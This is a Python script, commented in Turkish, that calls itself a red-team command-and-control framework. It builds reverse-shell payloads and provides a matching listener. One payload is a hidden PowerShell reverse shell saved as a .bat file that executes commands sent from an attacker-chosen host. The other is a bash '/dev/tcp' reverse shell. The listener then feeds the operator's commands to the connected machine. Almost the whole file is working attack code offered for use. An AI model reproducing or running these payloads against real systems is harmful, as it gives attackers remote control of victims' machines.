#!/usr/bin/env python3
"""
RedTeam Command & Control (C2) Framework
========================================
Sızma testleri için Payload oluşturucu ve Dinleyici (Listener) bir arada.
"""
import os
import sys
import socket

# ANSI Renk Kodları (Terminali şık ve renkli yapmak için)
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{C.RED}{C.BOLD}
    ██▀███  ▓█████ ▓█████▄▄▄█████▓▓█████  ▄▄▄       ███▄ ▄███▓
   ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓  ██▒ ▓▒▓█   ▀ ▒████▄    ▓██▒▀█▀ ██▒
   ▓██ ░▄█ ▒▒███   ░██   █▌▒ ▓██░ ▒░▒███   ▒██  ▀█▄  ▓██    ▓██░
   ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░ ▓██▓ ░ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██ 
   ░██▓ ▒██▒░▒████▒░▒████▓   ▒██▒ ░ ░▒████▒ ▓█   ▓██▒▒██▒   ░██▒
   ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒   ▒ ░░   ░░ ▒░ ░ ▒▒   ▓▒█░░ ▒░   ░  ░
     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒     ░     ░ ░  ░  ▒   ▒▒ ░░  ░      ░
     ░░   ░    ░    ░ ░  ░   ░         ░     ░   ▒   ░      ░   
      ░        ░  ░   ░                ░  ░      ░  ░       ░   
                    ░                                           
        {C.CYAN}--- C2 Framework v2.0 | Advanced Edition ---{C.RESET}
"""
    print(banner)

def save_payload(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        print(f"\n{C.GREEN}[+] BAŞARILI! Payload oluşturuldu: {os.path.abspath(filename)}{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}[-] Dosya yazma hatası: {e}{C.RESET}")

def payload_builder_menu():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] Payload Builder Modülü Başlatıldı{C.RESET}\n")
    
    lhost = input(f"{C.CYAN}[?] LHOST (Saldırgan IP): {C.RESET}").strip()
    lport = input(f"{C.CYAN}[?] LPORT (Saldırgan Port): {C.RESET}").strip()

    if not lhost or not lport:
        print(f"{C.RED}[-] Hata: Geçersiz IP veya Port.{C.RESET}")
        input(f"\n{C.YELLOW}Devam etmek için Enter'a basın...{C.RESET}")
        return

    print(f"\n{C.BLUE}--- Hedef Sistem Formatları ---{C.RESET}")
    print(f"{C.BOLD}1){C.RESET} Windows Batch (.bat)")
    print(f"{C.BOLD}2){C.RESET} Linux Bash (.sh)")
    
    choice = input(f"\n{C.CYAN}[>] Seçiminiz: {C.RESET}").strip()

    if choice == '1':
        # DÜZELTME: '$client = ' eklendi ve sözdizimi onarıldı.
        payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        save_payload("windows_payload.bat", payload)
    
    elif choice == '2':
        payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        save_payload("linux_payload.sh", payload)
    
    else:
        print(f"{C.RED}[-] Geçersiz seçim.{C.RESET}")
    
    input(f"\n{C.YELLOW}Ana menüye dönmek için Enter'a basın...{C.RESET}")

def start_listener():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] Listener (Dinleyici) Modülü Başlatıldı{C.RESET}\n")
    
    lport = input(f"{C.CYAN}[?] Dinlenecek Port (Örn: 4444): {C.RESET}").strip()
    
    if not lport.isdigit():
        print(f"{C.RED}[-] Hata: Geçersiz port numarası.{C.RESET}")
        input(f"\n{C.YELLOW}Devam etmek için Enter'a basın...{C.RESET}")
        return
        
    port = int(lport)
    print(f"\n{C.GREEN}[*] {port} portu dinleniyor... Bağlantı bekleniyor. (İptal için CTRL+C){C.RESET}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        
        conn, addr = s.accept()
        print(f"\n{C.RED}{C.BOLD}[!] BAĞLANTI GELDİ! Hedef: {addr[0]}:{addr[1]}{C.RESET}")
        print(f"{C.GREEN}[*] Shell etkileşimine geçiliyor...{C.RESET}\n")
        
        while True:
            cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
            if cmd.lower() in ['exit', 'quit']:
                break
                
            if len(cmd) > 0:
                conn.send(str.encode(cmd + "\n"))
                client_response = str(conn.recv(4096), "utf-8", errors="replace")
                print(f"{C.RESET}{client_response}", end="")
                
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Dinleme iptal edildi.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}[-] Bağlantı hatası: {e}{C.RESET}")
    finally:
        try:
            conn.close()
        except:
            pass
        s.close()
    
    input(f"\n{C.YELLOW}Ana menüye dönmek için Enter'a basın...{C.RESET}")

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(f"{C.BOLD}AKTİF MODÜLLER:{C.RESET}")
        print(f"  {C.CYAN}1){C.RESET} Payload Builder (Hedef Dosya Oluştur)")
        print(f"  {C.CYAN}2){C.RESET} Listener Başlat (Bağlantı Bekle)")
        print(f"  {C.CYAN}0){C.RESET} Çıkış\n")
        
        choice = input(f"{C.CYAN}[>] Seçiminiz: {C.RESET}").strip()
        
        if choice == '1':
            payload_builder_menu()
        elif choice == '2':
            start_listener()
        elif choice == '0':
            print(f"{C.RED}[*] C2 Framework kapatılıyor... İyi avlar!{C.RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main_menu()
